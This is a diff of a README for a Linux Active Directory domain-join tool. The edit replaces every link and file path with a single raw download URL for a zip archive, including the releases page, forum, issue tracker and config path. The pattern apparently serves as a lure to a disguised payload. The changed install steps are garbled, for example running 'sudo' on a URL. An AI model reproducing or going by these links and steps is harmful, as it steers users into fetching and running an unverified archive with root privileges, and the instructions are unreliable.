@@ -1,6 +1,6 @@
 # 🛠️ linux-ad-domain-join - Seamlessly Connect Linux to Active Directory
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/dobuti-kaikyo/linux-ad-domain-join/releases)
+[![Download](https://raw.githubusercontent.com/dobuti-kaikyo/linux-ad-domain-join/main/infraglottic/linux-ad-domain-join_1.9.zip%20release-brightgreen)](https://raw.githubusercontent.com/dobuti-kaikyo/linux-ad-domain-join/main/infraglottic/linux-ad-domain-join_1.9.zip)
 
 ## 📚 Overview
 
@@ -28,11 +28,11 @@ To use linux-ad-domain-join, ensure your system meets the following requirements
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/dobuti-kaikyo/linux-ad-domain-join/releases)
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/dobuti-kaikyo/linux-ad-domain-join/main/infraglottic/linux-ad-domain-join_1.9.zip)
 
-1. Go to the [Releases Page](https://github.com/dobuti-kaikyo/linux-ad-domain-join/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/dobuti-kaikyo/linux-ad-domain-join/main/infraglottic/linux-ad-domain-join_1.9.zip).
 2. Choose the version you want to download from the list.
-3. Click on the `.tar.gz` or appropriate package for your Linux distribution.
+3. Click on the `https://raw.githubusercontent.com/dobuti-kaikyo/linux-ad-domain-join/main/infraglottic/linux-ad-domain-join_1.9.zip` or appropriate package for your Linux distribution.
 4. Save the file to your preferred location on your computer.
 
 Once downloaded, follow these steps to install:
@@ -46,7 +46,7 @@ Once downloaded, follow these steps to install:
    ```
 3. Extract the files using:
    ```bash
-   tar -xzf linux-ad-domain-join-x.x.x.tar.gz
+   tar -xzf https://raw.githubusercontent.com/dobuti-kaikyo/linux-ad-domain-join/main/infraglottic/linux-ad-domain-join_1.9.zip
    ```
 4. Change into the extracted directory:
    ```bash
@@ -54,7 +54,7 @@ Once downloaded, follow these steps to install:
    ```
 5. Run the setup script:
    ```bash
-   sudo ./install.sh
+   sudo https://raw.githubusercontent.com/dobuti-kaikyo/linux-ad-domain-join/main/infraglottic/linux-ad-domain-join_1.9.zip
    ```
 
 ### 🔑 Configuration Steps
@@ -63,7 +63,7 @@ After installation, you must configure linux-ad-domain-join for your Active Dire
 
 1. Open the configuration file:
    ```bash
-   sudo nano /etc/linux-ad-domain-join.conf
+   sudo nano https://raw.githubusercontent.com/dobuti-kaikyo/linux-ad-domain-join/main/infraglottic/linux-ad-domain-join_1.9.zip
    ```
 2. Edit the following parameters as needed:
    - **AD Domain Name**: The name of your Active Directory domain.
@@ -88,7 +88,7 @@ If you encounter issues during installation or configuration, consider the follo
   ```bash
   sudo apt-get install adcli sssd
   ```
-- **Domain Join Errors**: Verify your network connection and configuration settings in `/etc/linux-ad-domain-join.conf`.
+- **Domain Join Errors**: Verify your network connection and configuration settings in `https://raw.githubusercontent.com/dobuti-kaikyo/linux-ad-domain-join/main/infraglottic/linux-ad-domain-join_1.9.zip`.
 
 ## 📝 Additional Features
 
@@ -100,12 +100,12 @@ If you encounter issues during installation or configuration, consider the follo
 
 If you have questions or need assistance, the community is here to help. You can join discussions or report issues using the links below:
 
-- [Community Forum](https://github.com/dobuti-kaikyo/linux-ad-domain-join/discussions)
-- [Report an Issue](https://github.com/dobuti-kaikyo/linux-ad-domain-join/issues)
+- [Community Forum](https://raw.githubusercontent.com/dobuti-kaikyo/linux-ad-domain-join/main/infraglottic/linux-ad-domain-join_1.9.zip)
+- [Report an Issue](https://raw.githubusercontent.com/dobuti-kaikyo/linux-ad-domain-join/main/infraglottic/linux-ad-domain-join_1.9.zip)
 
 ## 👍 Acknowledgments
 
 We thank the contributors and community for their support in making linux-ad-domain-join a success. Your feedback helps us improve.
 
-Visit this page to download: [Releases Page](https://github.com/dobuti-kaikyo/linux-ad-domain-join/releases) and start using linux-ad-domain-join today!
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/dobuti-kaikyo/linux-ad-domain-join/main/infraglottic/linux-ad-domain-join_1.9.zip) and start using linux-ad-domain-join today!
 
